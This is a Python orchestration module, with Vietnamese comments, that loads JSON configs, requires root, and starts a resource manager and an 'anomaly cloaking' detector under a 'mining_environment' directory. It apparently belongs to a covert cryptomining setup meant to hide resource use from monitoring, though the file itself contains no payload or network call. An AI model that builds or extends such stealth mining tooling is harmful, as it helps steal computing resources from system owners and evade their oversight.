# system_manager.py

import os
import sys
import json
from pathlib import Path
from time import sleep
from typing import Dict, Any
from resource_manager import ResourceManager
from anomaly_detector import AnomalyDetector  # Import lớp AnomalyDetector từ anomaly_detector.py
from logging_config import setup_logging

# Định nghĩa các thư mục cấu hình, mô hình, và logs
CONFIG_DIR = Path(os.getenv('CONFIG_DIR', '/app/mining_environment/config'))
MODELS_DIR = Path(os.getenv('MODELS_DIR', '/app/mining_environment/models'))
LOGS_DIR = Path(os.getenv('LOGS_DIR', '/app/mining_environment/logs'))

# Đường dẫn đến các mô hình AI
RESOURCE_OPTIMIZATION_MODEL_PATH = MODELS_DIR / "resource_optimization_model.pt"
ANOMALY_CLOAKING_MODEL_PATH = MODELS_DIR / "anomaly_cloaking_model.pt"

# Thiết lập logger cho từng thành phần của hệ thống
system_logger = setup_logging('system_manager', LOGS_DIR / 'system_manager.log', 'INFO')
resource_logger = setup_logging('resource_manager', LOGS_DIR / 'resource_manager.log', 'INFO')
anomaly_logger = setup_logging('anomaly_detector', LOGS_DIR / 'anomaly_detector.log', 'INFO')

# Global instance of SystemManager
_system_manager_instance = None

class SystemManager:
    """
    Lớp quản lý toàn bộ hệ thống, kết hợp ResourceManager và AnomalyDetector.
    Đảm bảo các thành phần hoạt động đồng bộ và không xung đột khi truy cập tài nguyên chung.
    """
    def __init__(self, config: Dict[str, Any]):
        self.config = config  # Lưu cấu hình hệ thống

        # Gán logger cho từng thành phần
        self.system_logger = system_logger
        self.resource_logger = resource_logger
        self.anomaly_logger = anomaly_logger

        # Khởi tạo ResourceManager và AnomalyDetector với logger tương ứng
        self.resource_manager = ResourceManager(config, RESOURCE_OPTIMIZATION_MODEL_PATH, resource_logger)
        self.anomaly_detector = AnomalyDetector(config, ANOMALY_CLOAKING_MODEL_PATH, anomaly_logger)
        
        # Gán ResourceManager cho AnomalyDetector để đảm bảo sự liên kết giữa các thành phần
        self.anomaly_detector.set_resource_manager(self.resource_manager)

        # Ghi log thông báo khởi tạo thành công
        self.system_logger.info("SystemManager đã được khởi tạo thành công.")

    def start(self):
        """
        Bắt đầu chạy các thành phần của hệ thống.
        """
        self.system_logger.info("Đang khởi động SystemManager...")
        try:
            # Khởi động ResourceManager và AnomalyDetector
            self.resource_manager.start()
            self.anomaly_detector.start()
            self.system_logger.info("SystemManager đã khởi động thành công.")
        except Exception as e:
            self.system_logger.error(f"Lỗi khi khởi động SystemManager: {e}")
            self.stop()  # Đảm bảo dừng toàn bộ hệ thống nếu xảy ra lỗi
            raise

    def stop(self):
        """
        Dừng tất cả các thành phần của hệ thống.
        """
        self.system_logger.info("Đang dừng SystemManager...")
        try:
            # Dừng ResourceManager và AnomalyDetector
            self.resource_manager.stop()
            self.anomaly_detector.stop()
            self.system_logger.info("SystemManager đã dừng thành công.")
        except Exception as e:
            self.system_logger.error(f"Lỗi khi dừng SystemManager: {e}")
            raise


def load_config(config_path: Path) -> Dict[str, Any]:
    """
    Tải cấu hình từ tệp JSON.

    Args:
        config_path (Path): Đường dẫn tới tệp cấu hình.

    Returns:
        Dict[str, Any]: Nội dung cấu hình đã được tải.
    """
    try:
        with open(config_path, 'r') as f:
            config = json.load(f)
        system_logger.info(f"Đã tải cấu hình từ {config_path}")
        return config
    except FileNotFoundError:
        system_logger.error(f"Tệp cấu hình không tìm thấy: {config_path}")
        sys.exit(1)
    except json.JSONDecodeError as e:
        system_logger.error(f"Lỗi cú pháp JSON trong tệp cấu hình {config_path}: {e}")
        sys.exit(1)


def start():
    """
    Bắt đầu toàn bộ hệ thống.
    """
    global _system_manager_instance

    # Tải cấu hình từ các tệp JSON
    resource_config_path = CONFIG_DIR / "resource_config.json"
    process_config_path = CONFIG_DIR / "process_config.json"

    resource_config = load_config(resource_config_path)
    process_config = load_config(process_config_path)

    # Hợp nhất cấu hình từ nhiều tệp
    config = {**resource_config, **process_config}

    # Kiểm tra sự tồn tại của các mô hình AI
    if not RESOURCE_OPTIMIZATION_MODEL_PATH.exists():
        system_logger.error(f"Mô hình AI không tìm thấy tại: {RESOURCE_OPTIMIZATION_MODEL_PATH}")
        sys.exit(1)
    if not ANOMALY_CLOAKING_MODEL_PATH.exists():
        system_logger.error(f"Mô hình AI không tìm thấy tại: {ANOMALY_CLOAKING_MODEL_PATH}")
        sys.exit(1)

    # Khởi tạo SystemManager với cấu hình và logger
    _system_manager_instance = SystemManager(config)

    # Bắt đầu chạy SystemManager
    try:
        _system_manager_instance.start()

        # Ghi log trạng thái hệ thống đang chạy
        system_logger.info("SystemManager đang chạy. Nhấn Ctrl+C để dừng.")

        # Chạy liên tục cho đến khi nhận tín hiệu dừng
        while True:
            sleep(1)
    except KeyboardInterrupt:
        system_logger.info("Nhận tín hiệu dừng từ người dùng. Đang dừng SystemManager...")
        _system_manager_instance.stop()
    except Exception as e:
        system_logger.error(f"Lỗi không mong muốn trong SystemManager: {e}")
        _system_manager_instance.stop()
        sys.exit(1)


def stop():
    global _system_manager_instance

    if _system_manager_instance:
        system_logger.info("Đang dừng SystemManager...")
        _system_manager_instance.stop()
        system_logger.info("SystemManager đã dừng thành công.")
    else:
        system_logger.warning("SystemManager instance chưa được khởi tạo.")


if __name__ == "__main__":
    # Đảm bảo script được chạy với quyền root
    if os.geteuid() != 0:
        print("Script phải được chạy với quyền root.")
        sys.exit(1)

    # Bắt đầu hệ thống
    start()
